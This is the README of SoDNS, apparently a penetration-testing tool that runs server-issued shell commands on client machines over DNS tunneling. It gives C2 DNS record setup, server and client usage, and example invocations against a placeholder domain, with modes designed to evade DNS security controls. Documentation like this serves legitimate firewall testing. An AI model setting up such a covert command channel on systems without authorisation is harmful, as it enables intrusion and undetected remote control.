# SoDNS - Shell over DNS

```
   _____       ____  _   _______             _____ __         ____                           ____  _   _______
  / ___/____  / __ \/ | / / ___/            / ___// /_  ___  / / /  ____ _   _____  _____   / __ \/ | / / ___/
  \__ \/ __ \/ / / /  |/ /\__ \   ______    \__ \/ __ \/ _ \/ / /  / __ | | / / _ \/ ___/  / / / /  |/ /\__ \ 
 ___/ / /_/ / /_/ / /|  /___/ /  /_____/   ___/ / / / /  __/ / /  / /_/ | |/ /  __/ /     / /_/ / /|  /___/ / 
/____/\____/_____/_/ |_//____/            /____/_/ /_/\___/_/_/   \____/|___/\___/_/     /_____/_/ |_//____/  
```


SoDNS is a client-server tool designed to execute arbitrary commands on client-side systems via DNS tunneling, with the server providing the commands. This approach offers a unique avenue for network penetration testing and DNS firewall assessment by leveraging the often-unmonitored DNS protocol for command and control (C2) communications.

## Technical Details

This tool uses DNS tunneling, a technique that encapsulates arbitrary data within DNS queries and responses, enabling it to bypass traditional network restrictions that typically block traditional ports. Flexibility in encoding and query modes allows testers to experiment with various circumvention techniques, challenging the effectiveness of DNS firewall implementations and intrusion detection systems. Different modes of operation (`-m`) can be used to attempt to circumvent various filtering and detection strategies. With different modes, you can specify the times between queries (`-t`) and the size of data to be moved with a single subdomain (`-w`). This can make detection more difficult for traditional DNS-based security controls.

## Usage

### DNS Configuration

If the tool is to be used with a domain name, dns records must be entered with the domain provider as shown below.

* **A Record:** Maps the subdomain name (`t1ns`) to your server's IPv4 address (e.g. `xx.x.x.x.xx`).
* **AAAA Registration:** Maps the subdomain name (`t1ns`) to the IPv6 address of your server (e.g. `::ffff:x.xx.xx.x.xx`).
* **NS Registration:** Assigns the subdomain name (`t1`) to your name server (e.g. `t1ns.xxxxxx.net`).

**Note:** Replace the example domain names and IP addresses with the actual values for your environment.

### Server
```bash
usage: server.py [-h] [--encode_type {base64,base85}] -d DOMAIN

DNS Server Usage:

options:
  -h, --help            show this help message and exit
  --encode_type {base64,base85}, -e {base64,base85}
                        Optional encode type for DNS data processing
  -d DOMAIN, --domain DOMAIN
                        Domain name.
```
**Example:**

```bash
python server.py -d mydomain.com -e base85 
```

### Client
```bash
usage: client.py [-h] -d DOMAIN [-s DNS_SERVER_IP] [-p DNS_SERVER_PORT] [-m {1,2,3,4,5}] [-e {base64,base85}] [-q {A,AAAA,CNAME,TXT,ALL}] [-t TIME] [-w WINDOWS_SIZE]

Perform DNS queries and resolve commands.

options:
  -h, --help            show this help message and exit
  -d DOMAIN, --domain DOMAIN
                        Domain name to query.
  -s DNS_SERVER_IP, --dns_server_ip DNS_SERVER_IP
                        DNS server IP address (default: 8.8.8.8).
  -p DNS_SERVER_PORT, --dns_server_port DNS_SERVER_PORT
                        DNS server port (default: 53).
  -m {1,2,3,4,5}, --mode {1,2,3,4,5}
                        Mode option (1, 2, 3, 4 or 5, default: 1).
  -e {base64,base85}, --encode_type {base64,base85}
                        Encoding type (default: base64).
  -q {A,AAAA,CNAME,TXT,ALL}, --q_type {A,AAAA,CNAME,TXT,ALL}
                        DNS query type (default: A).
  -t TIME, --time TIME  Waiting time to between DNS Queries (Default 0 sec).
  -w WINDOWS_SIZE, --windows_size WINDOWS_SIZE
                        Length of data to be carried in DNS query (1-63, default: 63).
```
**Example:**

```bash
python client.py -d mydomain.com -e base85 -m 1
```
### Sample Scenario
The server is started. Add command with `add whoami hex`. 

![image](https://github.com/user-attachments/assets/0404853f-7db8-447f-b49a-d0a6217cff39)

The code entered by the server is executed locally and the result is returned. 

![image](https://github.com/user-attachments/assets/f8ed06cb-440d-4c78-b133-29825859a7f6)

Tested on Linux and windows systems.

## Disclaimer of Liability
This tool is for educational and research purposes only. The user is responsible for ensuring compliance with all applicable laws and ethical rules. The creators are not responsible for any misuse or consequences resulting from its use.

